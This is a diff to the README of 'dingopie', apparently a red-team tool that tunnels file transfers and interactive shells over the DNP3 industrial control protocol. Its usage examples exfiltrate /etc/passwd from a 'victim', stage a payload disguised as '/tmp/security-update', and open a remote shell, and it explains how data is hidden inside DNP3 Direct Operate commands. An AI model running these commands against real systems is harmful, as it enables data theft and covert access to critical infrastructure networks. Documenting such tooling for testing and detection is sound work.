@@ -4,14 +4,14 @@
 
 ![dingopie](.media/dingopie.png)
 
-Dingopie is a tool for tunneling traffic over DNP3. There are two main functions: transferring files (send/receive), and establishing an interactive shell (shell/connect).
+dingopie is a tool for tunneling traffic over DNP3. There are two main functions: transferring files (send/receive), and establishing an interactive shell (shell/connect).
 
 #### Exfiltrate a file
 ```bash
 # on victim
-$ dingopie server direct send --file /etc/passwd --key secret
+$ dingopie server direct send --file /etc/passwd --key "Setec Astronomy"
 # on attacker or intermediary
-$ dingopie client direct receive --file loot/victim1-etc-passwd.txt --key secret --server-ip 10.1.2.3
+$ dingopie client direct receive --file loot/victim1-etc-passwd.txt --key "Setec Astronomy" --server-ip 10.1.2.3
 ```
 
 #### Stage a payload
@@ -19,7 +19,7 @@ $ dingopie client direct receive --file loot/victim1-etc-passwd.txt --key secret
 # on victim
 $ dingopie server direct receive --file /tmp/security-update
 # on attacker
-$ dingopie client direct send --file payloads/janeks-box.bin
+$ dingopie client direct send --file payloads/janeks-box.exe --server-ip 10.1.2.3
 ```
 
 #### Tunnel a shell over DNP3
@@ -27,7 +27,7 @@ $ dingopie client direct send --file payloads/janeks-box.bin
 # on victim
 $ dingopie server direct shell
 # on attacker
-$ dingopie client direct connect --server-ip 127.0.0.1
+$ dingopie client direct connect --server-ip 10.1.2.3
 dingopie>       # This is a fully interactive shell
 ```
 
@@ -37,8 +37,9 @@ dingopie has three different options: the role, the mode, and the action. Each i
 
 ### Roles
 
-* **Server** - The server role is designed to act like a DNP3 outstation, and should be placed 'lower' in the purdue model. The server needs to be started before the client.
-* **Client** - The client role is designed to act like a DNP3 master, and should be run 'higher' in the purdue model.
+* **server** - The server role is designed to act like a DNP3 outstation, and should be placed 'lower' in the purdue model. The server needs to be started before the client.
+
+* **client** - The client role is designed to act like a DNP3 master, and should be run 'higher' in the purdue model.
 
 ### Modes
 
@@ -58,7 +59,11 @@ In inject mode, dingopie 'rides on top of' an existing DNP3 channel. Data is add
 Actions are paired, so that each side of a session needs to run one of the actions.
 
  * **send/receive** - transfers data in one direction (either server to client or the reverse).
+
 * **shell/connect** - creates a pty on one device and allows the connecting device to run an interactive shell.
+
+> [!NOTE]
+> The `shell` action cannot be run on Windows hosts.
 
 ## Protocol
 
@@ -68,7 +73,7 @@ There are three different message sequences that dingopie uses depending on the 
 
 > Example [primary.pcapng.gz](.media/primary.pcapng.gz)
 
-Primary is the term that the DNP3 specification uses for describing connections from a DNP3 master to outstation. Dingopie borrows this nomenclature to describe when a client is sending data to a server. This sequence uses DNP3 Direct Operate commands and Group 41, Variation 1 (Analog Output Command - 32 bit) objects to transfer data. Direct Operate commands need to be acknowledged, so each data message sent by the client will be echoed back by the server. This will result in high traffic volume. It is also unrealistic to see so many repeated (and random) commands.
+Primary is the term that the DNP3 specification uses for describing connections from a DNP3 master to outstation. dingopie borrows this nomenclature to describe when a client is sending data to a server. This sequence uses DNP3 Direct Operate commands and Group 41, Variation 1 (Analog Output Command - 32 bit) objects to transfer data. Direct Operate commands need to be acknowledged, so each data message sent by the client will be echoed back by the server. This will result in high traffic volume. It is also unrealistic to see so many repeated (and random) commands.
 
 ```mermaid
 sequenceDiagram
